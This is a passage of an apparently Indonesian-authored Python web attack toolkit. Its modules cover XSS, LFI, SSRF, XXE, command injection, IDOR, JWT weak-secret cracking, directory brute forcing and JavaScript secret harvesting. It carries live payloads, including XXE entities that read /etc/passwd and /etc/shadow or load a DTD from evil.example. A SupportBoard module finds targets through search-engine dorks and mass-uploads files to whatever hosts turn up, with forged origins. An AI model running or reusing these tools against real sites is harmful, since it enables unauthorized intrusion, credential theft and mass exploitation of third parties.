        "javascript:alert(1)",
        '"><body onload=alert(1)>',
        "\"><details open ontoggle=alert(1)>",
    ]
    for param in qs:
        for pay in payloads:
            nq = qs.copy(); nq[param] = [pay]
            test = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
            r = safe_get(test)
            if r and pay in r.text:
                print(f"  {Fore.RED}[REFLECT]{Style.RESET_ALL} {param} :: {pay[:40]}")
                add_finding("medium","xss",f"Reflected XSS on '{param}'",
                            f"payload={pay[:40]}", test); break
    log("XSS scan done","ok")


def mod_takeover():
    clear(); print_banner()
    target = clean_host(ask("Subdomain/host"))
    if not target: return
    log(f"Takeover check: {target}","step")
    cnames = []
    try:
        out = subprocess.check_output(["nslookup","-type=CNAME",target],
                                      timeout=8, stderr=subprocess.DEVNULL)
        cnames = [c.decode().rstrip(".") for c in
                  re.findall(rb"canonical name = ([\w\-\.]+)\.", out)]
    except Exception: pass
    print(f"  {Fore.CYAN}CNAME:{Style.RESET_ALL} {cnames or '(none)'}")
    r = safe_get(f"https://{target}") or safe_get(f"http://{target}")
    if not r: log("Host unreachable","warn"); return
    body = r.text.lower()
    for cname_needle, body_sig in TAKEOVER_FINGERPRINTS:
        if body_sig.lower() in body or any(cname_needle in c for c in cnames):
            if body_sig.lower() in body:
                print(f"  {Fore.RED}[TAKEOVER]{Style.RESET_ALL} sig={body_sig!r}")
                add_finding("high","takeover","Subdomain takeover candidate",
                            f"cname={cname_needle} sig={body_sig}", target); return
    print(f"  {Fore.GREEN}[safe]{Style.RESET_ALL} No takeover signature")


def mod_dirbrute():
    clear(); print_banner()
    url = ask("Base URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    base = url.rstrip("/")
    log(f"Dir brute: {base}","step")
    baseline = safe_get(base + "/___notexist___")
    base_len = len(baseline.content) if baseline else 0
    def probe(word):
        try:
            r = requests.get(f"{base}/{word}", headers=req_headers(),
                             timeout=8, verify=False, allow_redirects=False, proxies=proxies())
            if r.status_code in (200,301,302,401,403,500) and abs(len(r.content)-base_len) > 30:
                return word, r.status_code, len(r.content)
        except Exception: pass
        return None
    hits = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(probe, DIR_WORDLIST):
            if res:
                word, code, size = res; hits.append(res)
                color = {200:Fore.GREEN,301:Fore.CYAN,302:Fore.CYAN,
                         401:Fore.YELLOW,403:Fore.YELLOW,500:Fore.RED}.get(code,"")
                print(f"  {color}[{code}]{Style.RESET_ALL} /{word:<25} {size}b")
                if code == 200 and any(k in word for k in
                   ["admin","backup","config",".git",".env","db","sql","secret"]):
                    add_finding("high","dirbrute",f"Exposed: /{word}",
                                f"{code} {size}b", f"{base}/{word}")
    log(f"Hits: {len(hits)}","ok" if hits else "info")
    REPORT["artifacts"]["dirbrute"] = hits


def mod_waf():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"WAF detect: {url}","step")
    r = safe_get(url)
    if not r: log("Failed","err"); return
    hdrs = {k.lower():v for k,v in r.headers.items()}
    body = r.text.lower()
    combined = "\n".join(f"{k}: {v}" for k,v in hdrs.items()) + "\n" + body
    detected = [w for w,sigs in WAF_SIGNATURES.items() if any(s in combined for s in sigs)]
    attack = f"{url}{'&' if '?' in url else '?'}x=<script>alert(1)</script>'"
    try:
        r2 = requests.get(attack, headers=req_headers(), timeout=TIMEOUT,
                          verify=False, proxies=proxies())
        if r2.status_code in (403,406,419,501,999):
            detected.append(f"behavior({r2.status_code})")
    except Exception: pass
    print(f"\n  {Fore.YELLOW}─ WAF Result ─{Style.RESET_ALL}")
    if detected:
        for w in detected: print(f"  {Fore.RED}[!]{Style.RESET_ALL} {w}")
        add_finding("info","waf","WAF detected",", ".join(detected), url)
    else:
        print(f"  {Fore.GREEN}[safe]{Style.RESET_ALL} No WAF signature detected")
    REPORT["artifacts"]["waf"] = detected


def mod_ssl():
    clear(); print_banner()
    target = clean_host(ask("Host"))
    if not target: return
    log(f"SSL inspect: {target}","step")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((target,443),timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert(); cipher = ssock.cipher(); ver = ssock.version()
        print(f"  {Fore.CYAN}TLS:{Style.RESET_ALL} {ver}  {Fore.CYAN}Cipher:{Style.RESET_ALL} {cipher}")
        if cert:
            subject = dict(x[0] for x in cert.get("subject",[]))
            issuer  = dict(x[0] for x in cert.get("issuer",[]))
            print(f"  {Fore.CYAN}CN:{Style.RESET_ALL} {subject.get('commonName','?')}")
            print(f"  {Fore.CYAN}Issuer:{Style.RESET_ALL} {issuer.get('organizationName','?')}")
            print(f"  {Fore.CYAN}Expires:{Style.RESET_ALL} {cert.get('notAfter','?')}")
            sans = [v for k,v in cert.get("subjectAltName",[]) if k=="DNS"]
            print(f"  {Fore.CYAN}SANs ({len(sans)}):{Style.RESET_ALL}")
            for s in sans[:15]: print(f"    {s}")
            # check expiry
            try:
                exp = datetime.strptime(cert.get("notAfter",""), "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - datetime.utcnow()).days
                if days_left < 30:
                    add_finding("high" if days_left < 7 else "medium","ssl",
                                f"Certificate expires in {days_left} days","", target)
            except Exception: pass
        if ver in ("TLSv1","TLSv1.1","SSLv3"):
            add_finding("high","ssl",f"Weak TLS version: {ver}","", target)
    except Exception as e:
        log(f"SSL error: {e}","err")


def mod_methods():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"HTTP methods: {url}","step")
    methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE","CONNECT","HEAD"]
    allowed = []
    for m in methods:
        try:
            r = requests.request(m, url, headers=req_headers(), timeout=TIMEOUT,
                                 verify=False, proxies=proxies())
            if r.status_code not in (405,501,400):
                allowed.append(m)
                color = Fore.RED if m in ("PUT","DELETE","TRACE","CONNECT") else Fore.GREEN
                print(f"  {color}[{m}]{Style.RESET_ALL} → {r.status_code}")
                if m in ("PUT","DELETE"):
                    add_finding("medium","methods",f"Dangerous method: {m}",
                                f"status={r.status_code}", url)
                if m == "TRACE":
                    add_finding("low","methods","TRACE method enabled","",url)
        except Exception: pass
    REPORT["artifacts"]["methods"] = allowed


def _b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def mod_jwt():
    clear(); print_banner()
    tok = ask("JWT token").replace("Bearer ","").strip()
    if not tok: return
    parts = tok.split(".")
    if len(parts) != 3: log("Format invalid","err"); return
    try:
        hdr = json.loads(_b64d(parts[0]))
        pld = json.loads(_b64d(parts[1]))
    except Exception as e:
        log(f"Decode fail: {e}","err"); return
    print(f"\n  {Fore.YELLOW}─ Header ─{Style.RESET_ALL}\n  {json.dumps(hdr,indent=2)}")
    print(f"\n  {Fore.YELLOW}─ Payload ─{Style.RESET_ALL}\n  {json.dumps(pld,indent=2)}")
    alg = hdr.get("alg","").lower()
    if alg == "none":
        add_finding("critical","jwt","JWT alg=none","trivial bypass","")
    if alg.startswith("hs"):
        weak = ["secret","password","123456","admin","key","changeme","qwerty","jwt","token"]
        for sec in weak:
            msg = f"{parts[0]}.{parts[1]}".encode()
            bits = int(alg[2:]) if alg[2:] in ("256","384","512") else 256
            hash_fn = {256:"sha256",384:"sha384",512:"sha512"}.get(bits,"sha256")
            import hashlib as _hl
            expected = base64.urlsafe_b64encode(
                hmac.new(sec.encode(), msg, getattr(_hl,hash_fn)).digest()
            ).rstrip(b"=").decode()
            if expected == parts[2]:
                print(f"  {Fore.RED}[WEAK SECRET]{Style.RESET_ALL} secret='{sec}'")
                add_finding("critical","jwt","Weak JWT secret",f"secret='{sec}'",""); break
    if "exp" in pld:
        try:
            exp = datetime.utcfromtimestamp(pld["exp"])
            left = (exp - datetime.utcnow()).total_seconds()
            print(f"\n  {Fore.CYAN}Expires:{Style.RESET_ALL} {exp} ({'expired' if left<0 else f'{int(left/60)}m left'})")
            if left < 0: add_finding("info","jwt","JWT is expired","",  "")
        except Exception: pass


def mod_lfi():
    clear(); print_banner()
    url = ask("URL dengan param")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)
    if not qs: log("Butuh parameter","err"); return
    log(f"LFI: {url}","step")
    indicators = [("linux","root:x:0:0"),("linux","daemon:"),
                  ("windows","[extensions]"),("windows","[fonts]")]
    for param in qs:
        for pay in LFI_PAYLOADS:
            nq = qs.copy(); nq[param] = [pay]
            test = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
            r = safe_get(test)
            if not r: continue
            for label, ind in indicators:
                if ind in r.text:
                    print(f"  {Fore.RED}[LFI]{Style.RESET_ALL} {param} :: {pay}")
                    add_finding("critical","lfi",f"LFI on '{param}'",
                                f"payload={pay}, indicator='{ind}'", test); return
    log("LFI scan done","info")


def mod_ssrf():
    clear(); print_banner()
    url = ask("URL dengan param")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)
    if not qs: log("Butuh parameter","err"); return
    log(f"SSRF: {url}","step")
    indicators = ["169.254.169.254","instance-id","ami-id","security-credentials",
                  "root:x:0:0","127.0.0.1","localhost","-ERR unknown command"]
    baseline = safe_get(url)
    base_len = len(baseline.content) if baseline else 0
    for param in qs:
        for pay in SSRF_PAYLOADS:
            nq = qs.copy(); nq[param] = [pay]
            test = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
            r = safe_get(test, allow_redirects=False)
            if not r: continue
            for ind in indicators:
                if ind.lower() in r.text.lower():
                    print(f"  {Fore.RED}[SSRF]{Style.RESET_ALL} {param} :: {pay}")
                    add_finding("critical","ssrf",f"Potential SSRF on '{param}'",
                                f"payload={pay}", test); return
    log("SSRF scan done","info")


def mod_paramfuzz():
    clear(); print_banner()
    url = ask("URL (tanpa param)")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    base = url.split("?")[0]
    log(f"Param fuzz: {base} ({len(COMMON_PARAMS)} words)","step")
    baseline = safe_get(base)
    base_len = len(baseline.content) if baseline else 0
    def probe(param):
        test = f"{base}?{param}=test123FaRa"
        r = safe_get(test)
        if r and abs(len(r.content)-base_len) > 100 and r.status_code == 200:
            return param, r.status_code, len(r.content)
        return None
    found = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(probe, COMMON_PARAMS):
            if res:
                param, code, size = res; found.append(res)
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {param:<20} [{code}] {size}b")
    log(f"New params: {len(found)}","ok" if found else "info")
    REPORT["artifacts"]["paramfuzz"] = found


def mod_robots():
    clear(); print_banner()
    url = ask("Base URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    base = url.rstrip("/")
    paths_found = set()
    for path in ["robots.txt","sitemap.xml","sitemap_index.xml",".well-known/security.txt"]:
        r = safe_get(f"{base}/{path}")
        if r and r.status_code == 200 and len(r.content) > 5:
            print(f"\n  {Fore.GREEN}[+]{Style.RESET_ALL} /{path} ({len(r.content)}b)")
            for line in r.text.splitlines()[:60]:
                line = line.strip()
                if not line or line.startswith("#"): continue
                if line.lower().startswith(("disallow:","allow:","sitemap:")):
                    print(f"    {line}")
                    if "disallow:" in line.lower():
                        p = line.split(":",1)[1].strip()
                        if p and p != "/": paths_found.add(p)
    if paths_found:
        add_finding("info","robots",f"{len(paths_found)} paths found","review for sensitive", base)
        REPORT["artifacts"]["robots"] = list(paths_found)

# ═══════════════════════════════════════════════════════════
#            SUPPORTBOARD (original, unchanged)
# ═══════════════════════════════════════════════════════════

def _sb_check(host):
    for scheme in ("https","http"):
        for path in SUPPORTBOARD_ENDPOINTS:
            url = f"{scheme}://{host}{path}"
            try:
                r = requests.get(url, headers=req_headers(), timeout=8,
                                 verify=False, allow_redirects=False, proxies=proxies())
                if r.status_code in (200,301,302,405,500):
                    return {"url":url,"status":r.status_code,"path":path,"scheme":scheme}
            except Exception: continue
    return None


def _sb_build_multipart(fields, boundary):
    parts = []
    for name, fname, ctype, content in fields:
        if fname:
            parts.append(
                f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="{name}"; filename="{fname}"\r\n'
                f"Content-Type: {ctype}\r\n\r\n".encode() + content + b"\r\n")
        else:
            parts.append(
                f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="{name}"\r\n\r\n'.encode() + content + b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts)


def _sb_try_upload(upload_url, token_variant="none"):
    marker = "csrf_" + hashlib.md5(str(time.time()+random.random()).encode()).hexdigest()[:12]
    boundary = "----WpFormBoundary" + hashlib.md5(str(time.time()).encode()).hexdigest()
    fields = [("file",f"{marker}.txt","text/plain",f"CSRF_PROBE_{marker}".encode())]
    if token_variant == "empty": fields.append(("token",None,None,b""))
    payload = _sb_build_multipart(fields, boundary)
    h = req_headers({"Content-Type":f"multipart/form-data; boundary={boundary}",
                     "Origin":"https://evil.example","Referer":"https://evil.example/"})
    try:
        r = requests.post(upload_url, headers=h, data=payload, timeout=15,
                          verify=False, proxies=proxies())
        body_low = r.text.lower()
        hit_key = next((k for k in SUPPORTBOARD_MARKERS if k in body_low), None)
        m = re.search(r'uploads/sb/[\d\-]+/[\w\-\.]+', r.text)
        return {"status":r.status_code,"success":bool(hit_key) or bool(m),
                "key":hit_key,"path":m.group(0) if m else None,
                "marker":marker,"snippet":r.text[:200],"variant":token_variant}
    except Exception as e:
        return {"error":str(e),"variant":token_variant}


def _sb_verify_uploaded(upload_url, path, marker):
    if not path: return False
    p = urllib.parse.urlparse(upload_url)
    test_url = f"{p.scheme}://{p.netloc}/{path.lstrip('/')}"
    try:
        r = requests.get(test_url, headers=req_headers(), timeout=10,
                         verify=False, proxies=proxies())
        return r.status_code == 200 and marker in r.text
    except Exception: return False


def _sb_scan_one(host):
    found = _sb_check(host)
    if not found: return None
    up = _sb_try_upload(found["url"],"none")
    if not up.get("success"):
        up2 = _sb_try_upload(found["url"],"empty")
        if up2.get("success"): up = up2
    result = {"host":host,**found,"upload":up}
    if up.get("success") and up.get("path"):
        result["verified"] = _sb_verify_uploaded(found["url"],up["path"],up.get("marker",""))
    else:
        result["verified"] = False
    return result


def _sb_auto_dork_targets():
    raw = []
    for dork in SUPPORTBOARD_DORKS:
        for label, fn in (("DDG",_ddg),("Bing",_bing)):
            log(f"  {label} :: {dork[:60]}","step")
            hits = fn(dork,30); log(f"    {len(hits)} hasil","info")
            for r in hits:
                u = urllib.parse.urlparse(r["url"])
                if u.netloc: raw.append(u.netloc)
    return raw


def _sb_scan_batch(targets, auto_dork=False):
    raw = _sb_auto_dork_targets() if auto_dork else targets
    clean = []
    for t in raw:
        h = clean_host(t)
        if h and "." in h and h not in clean: clean.append(h)
    if not clean: log("Tidak ada target","err"); return []
    log(f"Scanning {len(clean)} host...","step")
    results, vuln, present = [], 0, 0
    with ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(_sb_scan_one, clean):
            if not res: continue
            results.append(res); present += 1; up = res["upload"]
            if res.get("verified"):
                vuln += 1
                file_url = f"{res['scheme']}://{res['host']}/{res['upload']['path'].lstrip('/')}"
                print(f"\n  {Fore.RED}{Style.BRIGHT}[VULN ✓]{Style.RESET_ALL} {res['host']}")
                print(f"        endpoint : {res['url']}\n        file url : {file_url}")
                add_finding("critical","supportboard","SupportBoard unauth upload (CSRF verified)",
                            f"{res['url']} → {file_url}", res["url"])
            elif up.get("success"):
                vuln += 1
                print(f"\n  {Fore.YELLOW}[LIKELY ✓]{Style.RESET_ALL} {res['host']}")
                add_finding("high","supportboard","SupportBoard upload accepted",
                            res["url"], res["url"])
            else:
                print(f"  {Fore.GREEN}[safe]{Style.RESET_ALL} {res['host']}")
    print(f"\n  Scanned: {len(clean)}  Present: {present}  Vulnerable: {vuln}")
    if results:
        save_file("supportboard_hits",[f"{r['host']}\t{r['url']}" for r in results])
        REPORT["artifacts"]["supportboard"] = results
    return results


def mod_supportboard():
    clear(); print_banner()
    print(f"\n  {Fore.YELLOW}SupportBoard CSRF/Upload Scanner{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL} Single domain")
    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL} Bulk paste domains")
    print(f"  {Fore.CYAN}[3]{Style.RESET_ALL} Auto-dork (DDG+Bing) lalu scan\n")
    mode = ask("Mode [1-3]")
    targets = []
    if mode == "1":
        t = ask("Domain"); targets = [t] if t else []
    elif mode == "2":
        print(f"    {Fore.CYAN}Paste domains (blank=stop):{Style.RESET_ALL}")
        while True:
            line = ask("")
            if not line: break
            targets.append(line)
    elif mode == "3":
        _sb_scan_batch(targets=[], auto_dork=True); return
    else: return
    _sb_scan_batch(targets=targets)

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 22 — IDOR Detector
# ═══════════════════════════════════════════════════════════

def mod_idor():
    """Test IDOR: ganti ID angka di URL/param, bandingkan response."""
    clear(); print_banner()
    url = ask("URL dengan ID di path/param (contoh: /api/user/5?id=5)")
    if not url: return
    if not url.startswith("http"): url = "https://" + url

    log(f"IDOR check: {url}","step")
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)

    # find numeric param or path segment
    num_params = {k:v[0] for k,v in qs.items() if v[0].isdigit()}
    path_ids = [(m.start(), m.end(), m.group()) for m in
                re.finditer(r'/(\d+)(?:/|$)', p.path)]

    if not num_params and not path_ids:
        log("Tidak ada ID angka di URL","warn"); return

    baseline = safe_get(url)
    if not baseline: log("Baseline fail","err"); return
    base_len = len(baseline.content)

    hits = []
    test_ids = [str(i) for i in range(1,6)]

    for tid in test_ids:
        # test param-based
        for param, orig in num_params.items():
            if tid == orig: continue
            nq = qs.copy(); nq[param] = [tid]
            test = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
            r = safe_get(test)
            if not r: continue
            diff = abs(len(r.content) - base_len)
            if r.status_code == 200 and diff > 50:
                print(f"  {Fore.RED}[IDOR?]{Style.RESET_ALL} {param}={tid} → {len(r.content)}b (diff={diff})")
                add_finding("high","idor",f"Possible IDOR on '{param}'",
                            f"id={tid} diff={diff}b", test)
                hits.append(test)
        # test path-based
        for start, end, orig_id in path_ids:
            if tid == orig_id: continue
            new_path = p.path[:start] + p.path[start:end].replace(orig_id, tid) + p.path[end:]
            test = urllib.parse.urlunparse(p._replace(path=new_path))
            r = safe_get(test)
            if not r: continue
            diff = abs(len(r.content) - base_len)
            if r.status_code == 200 and diff > 50:
                print(f"  {Fore.RED}[IDOR?]{Style.RESET_ALL} path id={tid} → {len(r.content)}b (diff={diff})")
                add_finding("high","idor",f"Possible IDOR in path",
                            f"id={tid} diff={diff}b", test)
                hits.append(test)
    log(f"Hits: {len(hits)}","ok" if hits else "info")

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 23 — XXE Tester
# ═══════════════════════════════════════════════════════════

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.example/xxe.dtd"><data>&send;</data>',
]

def mod_xxe():
    clear(); print_banner()
    url = ask("URL endpoint XML/SOAP")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"XXE: {url}","step")
    indicators = ["root:x:0:0","daemon:","[fonts]","[extensions]","ec2","ami-id"]
    hits = 0
    for pay in XXE_PAYLOADS:
        try:
            r = requests.post(url, data=pay.encode(),
                              headers=req_headers({"Content-Type":"application/xml"}),
                              timeout=TIMEOUT, verify=False, proxies=proxies())
            if any(ind in r.text for ind in indicators):
                print(f"  {Fore.RED}[XXE]{Style.RESET_ALL} {pay[:60]}...")
                add_finding("critical","xxe","XXE injection confirmed",
                            f"payload={pay[:60]}", url); hits += 1
            elif r.status_code == 500 and "xml" in r.text.lower():
                print(f"  {Fore.YELLOW}[SUSPECT]{Style.RESET_ALL} 500 + xml error")
        except Exception: pass
    log(f"Hits: {hits}","ok" if hits else "info")

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 24 — Command Injection
# ═══════════════════════════════════════════════════════════

CMDI_PAYLOADS = [
    (";id","uid="),
    ("|id","uid="),
    ("`id`","uid="),
    ("$(id)","uid="),
    (";sleep 3",""),  # time-based
    ("&&id","uid="),
    ("%0aid","uid="),
]

def mod_cmdi():
    clear(); print_banner()
    url = ask("URL dengan param")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)
    if not qs: log("Butuh parameter","err"); return
    log(f"CMDi: {url}","step")
    hits = 0
    for param in qs:
        orig = qs[param][0]
        for suffix, indicator in CMDI_PAYLOADS:
            nq = qs.copy(); nq[param] = [orig + suffix]
            test = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
            if "sleep" in suffix:
                t0 = time.time()
                r = safe_get(test)
                elapsed = time.time() - t0
                if elapsed > 2.5:
                    print(f"  {Fore.RED}[TIME-BASED]{Style.RESET_ALL} {param} :: {suffix} ({elapsed:.1f}s)")
                    add_finding("critical","cmdi",f"Time-based CMDi on '{param}'",
                                f"payload={suffix} delay={elapsed:.1f}s", test); hits += 1
            else:
                r = safe_get(test)
                if r and indicator and indicator in r.text:
                    print(f"  {Fore.RED}[CMDi]{Style.RESET_ALL} {param} :: {suffix}")
                    add_finding("critical","cmdi",f"Command injection on '{param}'",
                                f"payload={suffix}", test); hits += 1
    log(f"Hits: {hits}","ok" if hits else "info")

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 25 — JavaScript Secret Scanner
# ═══════════════════════════════════════════════════════════

JS_SECRET_PATTERNS = [
    (r"AKIA[0-9A-Z]{16}",                           "AWS Access Key"),
    (r"ghp_[A-Za-z0-9]{36}",                        "GitHub PAT"),
    (r"xox[baprs]-[A-Za-z0-9\-]{10,}",              "Slack Token"),
    (r"AIza[0-9A-Za-z_\-]{35}",                     "Google API Key"),
    (r"['\"]?api[_-]?key['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{16,})['\"]","Generic API Key"),
    (r"['\"]?secret['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{16,})['\"]","Generic Secret"),
    (r"['\"]?password['\"]?\s*[:=]\s*['\"]([^'\"]{8,})['\"]","Hardcoded Password"),
    (r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----","Private Key"),
    (r"mongodb(\+srv)?://[^'\"@\s]+@[^'\"@\s]+",   "MongoDB URI"),
    (r"postgres(?:ql)?://[^'\"@\s]+@[^'\"@\s]+",   "Postgres URI"),
    (r"(?:redis|rediss)://:[^@]+@[^'\"@\s]+",       "Redis URI"),
    (r"['\"]?bearer['\"]?\s+([A-Za-z0-9_\-\.]{20,})","Bearer Token"),
]


def _scan_js_text(text, source=""):
    hits = []
    for pattern, label in JS_SECRET_PATTERNS:
        for m in re.finditer(pattern, text, re.I):
            val = m.group(0)[:80]
            hits.append((label, val, source))
    return hits


def mod_jsscan():
    clear(); print_banner()
    url = ask("Base URL (akan cari semua .js di halaman)")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"JS secret scan: {url}","step")

    r = safe_get(url)
    if not r: log("Failed","err"); return

    js_urls = set()
    for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
        raw = m.group(1)
        full = urllib.parse.urljoin(url, raw)
        js_urls.add(full)
    # also inline scripts
    inline_hits = _scan_js_text(r.text, "inline")

    log(f"Found {len(js_urls)} JS files + inline scan","info")
    all_hits = list(inline_hits)
    for js_url in list(js_urls)[:30]:
        jr = safe_get(js_url)
        if jr:
            all_hits.extend(_scan_js_text(jr.text, js_url.split("/")[-1][:40]))

    if all_hits:
        seen = set()
        for label, val, src in all_hits:
            key = (label, val[:30])
            if key in seen: continue
            seen.add(key)
            print(f"  {Fore.RED}[SECRET]{Style.RESET_ALL} {label:<22} {Fore.YELLOW}{val}{Style.RESET_ALL}")
            print(f"           └─ in: {src}")
            add_finding("critical","jsscan",f"Secret in JS: {label}",f"{val[:60]}", url)
    else:
        print(f"  {Fore.GREEN}[clean]{Style.RESET_ALL} Tidak ada secret ditemukan")
    log(f"Total hits: {len(set((l,v[:30]) for l,v,_ in all_hits))}",
        "ok" if all_hits else "info")

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 26 — Rate Limit / 429 Test
# ═══════════════════════════════════════════════════════════

def mod_ratelimit():
    clear(); print_banner()
    url = ask("URL endpoint (contoh: /api/login)")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    try:
        n = int(ask("Jumlah request [default 20]") or "20")
    except ValueError: n = 20
    log(f"Rate limit test: {url} ({n} req)","step")
    statuses = []
    for i in range(n):
        r = safe_get(url)
        code = r.status_code if r else 0
        statuses.append(code)
        mark = {429:Fore.RED, 403:Fore.YELLOW, 200:Fore.GREEN}.get(code,"")
        print(f"  [{i+1:>3}] {mark}{code}{Style.RESET_ALL}", end="\r", flush=True)
        time.sleep(0.05)
    print()
    ctr = Counter(statuses)
    log(f"Codes: {dict(ctr)}","info")
    if 429 not in ctr and ctr.get(200,0) == n:
        add_finding("medium","ratelimit","No rate limiting detected",
                    f"All {n} requests returned 200", url)
        print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Rate limit tidak ditemukan")
    elif 429 in ctr:
        print(f"  {Fore.GREEN}[OK]{Style.RESET_ALL} Rate limit aktif setelah ~{list(statuses).index(429)+1} req")

# ═══════════════════════════════════════════════════════════
#          MODUL BARU 27 — GraphQL Introspection
# ═══════════════════════════════════════════════════════════

GQL_INTRO = '{"query":"{ __schema { types { name } } }"}'
GQL_PATHS = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/gql"]


def mod_graphql():
    clear(); print_banner()
    url = ask("Base URL (auto-probe GraphQL endpoint)")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    base = url.rstrip("/")
    log(f"GraphQL probe: {base}","step")
    found_ep = None
    for path in GQL_PATHS:
        ep = base + path
        try:
            r = requests.post(ep, data=GQL_INTRO,
                              headers=req_headers({"Content-Type":"application/json"}),
                              timeout=TIMEOUT, verify=False, proxies=proxies())
            if r.status_code == 200 and "__schema" in r.text:
                found_ep = ep; break
            elif "graphql" in r.text.lower():
                found_ep = ep; break
        except Exception: pass
    if not found_ep:
        log("GraphQL endpoint tidak ditemukan","warn"); return
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Endpoint: {found_ep}")
    # check introspection enabled
    r = requests.post(found_ep, data=GQL_INTRO,
                      headers=req_headers({"Content-Type":"application/json"}),
                      timeout=TIMEOUT, verify=False, proxies=proxies())
    if "__schema" in r.text:
        print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Introspection enabled!")
        add_finding("medium","graphql","GraphQL introspection enabled",
                    "Exposes full schema", found_ep)
        try:
            types = [t["name"] for t in r.json()["data"]["__schema"]["types"]
                     if not t["name"].startswith("__")]
            print(f"  {Fore.CYAN}Types:{Style.RESET_ALL} {', '.join(types[:20])}")
        except Exception: pass
    else:
        print(f"  {Fore.GREEN}[OK]{Style.RESET_ALL} Introspection disabled")

# ═══════════════════════════════════════════════════════════
#               AUTO RECON (gaya FaRaSecImpossible)
# ═══════════════════════════════════════════════════════════

def mod_auto():
    clear(); print_banner()
    target = ask("Target (domain/URL)")
    if not target: return
    scheme, host, full = norm_target(target)
    dom = host
    REPORT["target"] = full
    REPORT["started"] = datetime.now().isoformat()
    REPORT["findings"].clear()
    REPORT["artifacts"].clear()

    _banner_step = lambda n, total, label: log(
        f"[{n}/{total}] {label}","hit")

    TOTAL = 12
    # ── 1. Subdomain ──────────────────────────────────────
    _banner_step(1, TOTAL, "Subdomain Enumeration")
    subs = _enum_subs(dom) if "." in dom else set()
    resolved = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for h, ip in ex.map(_resolve, sorted(subs) or [dom]):
            if ip:
                resolved.append((h, ip))
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {h:<45} {ip}")
    log(f"→ {len(resolved)} live","ok")
    REPORT["artifacts"]["subdomains"] = resolved

    # ── 2. Live probe ─────────────────────────────────────
    _banner_step(2, TOTAL, "Live Host Probe")
    live_urls = []
    for h, ip in (resolved or [(dom, host)])[:10]:
        for sch in ("https","http"):
            r = safe_get(f"{sch}://{h}")
            if r and r.status_code < 500:
                live_urls.append(f"{sch}://{h}")
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {sch}://{h} [{r.status_code}]"); break
    REPORT["artifacts"]["live"] = live_urls
    if not live_urls: live_urls = [full]

    # ── 3. Port scan ──────────────────────────────────────
    _banner_step(3, TOTAL, "Port Scan")
    open_ports = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        for res in ex.map(lambda p: _probe_port(host, p), COMMON_PORTS.keys()):
            if res:
                port, banner = res; open_ports.append(port)
                svc = COMMON_PORTS.get(port,"?")
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {port} ({svc}) {banner[:30]}")
                if port in (3306,5432,27017,6379,9200,21,23):
                    add_finding("high","portscan",f"Dangerous port: {port}",svc,host)
